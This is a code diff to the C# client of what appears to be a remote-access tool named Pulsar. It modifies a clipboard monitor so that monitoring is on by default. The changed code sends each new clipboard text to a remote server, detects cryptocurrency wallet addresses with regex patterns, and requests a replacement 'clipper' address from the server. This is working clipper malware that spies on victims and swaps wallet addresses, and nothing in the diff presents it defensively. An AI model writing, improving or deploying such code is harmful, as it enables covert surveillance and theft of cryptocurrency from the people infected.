@@ -47,8 +47,8 @@ namespace Pulsar.Client.User
             this.CreateHandle(new CreateParams());
             AddClipboardFormatListener(this.Handle);
             
-            _isEnabled = false;
-            Debug.WriteLine("ClipboardChecker: Initialized with monitoring disabled");
+            _isEnabled = true;
+            Debug.WriteLine("ClipboardChecker: Initialized with monitoring enabled");
         }
 
         /// <summary>
@@ -95,37 +95,34 @@ namespace Pulsar.Client.User
                     {
                         _lastClipboardText = clipboardText;
 
-                        Debug.WriteLine("New clipboard text detected, checking if should send to server...");
-
+                        bool isClipperAddress = Messages.ClipboardHandler._cachedAddresses.Contains(clipboardText);
+                        
                         bool wasRecentlyReceivedFromServer = 
                             Messages.ClipboardHandler._lastReceivedClipboardText.Equals(clipboardText) &&
                             (DateTime.Now - Messages.ClipboardHandler._lastReceivedTime).TotalSeconds < 2;
+
+                        Debug.WriteLine($"Is clipper address: {isClipperAddress}, Was from server recently: {wasRecentlyReceivedFromServer}");
                         
-                        Debug.WriteLine($"Was recently received from server: {wasRecentlyReceivedFromServer}");
-                        
-                        if (!wasRecentlyReceivedFromServer)
+                        if (!isClipperAddress && !wasRecentlyReceivedFromServer)
                         {
-                            Debug.WriteLine("Client detected clipboard change, sending to server...");
+                            Debug.WriteLine("New clipboard text detected, sending to server...");
                             Debug.WriteLine($"Client detected clipboard change: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
+                            
                             _client.Send(new SetUserClipboardStatus { ClipboardText = clipboardText });
+                            
+                            foreach (var pattern in _regexPatterns)
+                            {
+                                if (pattern.Item2.IsMatch(clipboardText))
+                                {
+                                    Debug.WriteLine($"Crypto address detected: {pattern.Item1}");
+                                    _client.Send(new DoGetAddress { Type = pattern.Item1 });
+                                    break;
+                                }
+                            }
                         }
                         else
                         {
-                            Console.WriteLine("Clipboard change was from server (within 2s), not sending back");
-                            Debug.WriteLine($"Clipboard change was from server (within 2s), not sending back");
-                        }
-                    }
-
-                    // If the copied address is already the clipped address, updating the clipboard with the same address will be
-                    // a waste of resources for both the server and client; it may also cause undefined behavior.
-                    if (!Messages.ClipboardHandler._cachedAddresses.Contains(clipboardText)) {
-                        foreach (var pattern in _regexPatterns)
-                        {
-                            if (pattern.Item2.IsMatch(clipboardText))
-                            {
-                                _client.Send(new DoGetAddress { Type = pattern.Item1 });
-                                break;
-                            }
+                            Debug.WriteLine("Clipboard change ignored (clipper address or from server sync)");
                         }
                     }
                 }
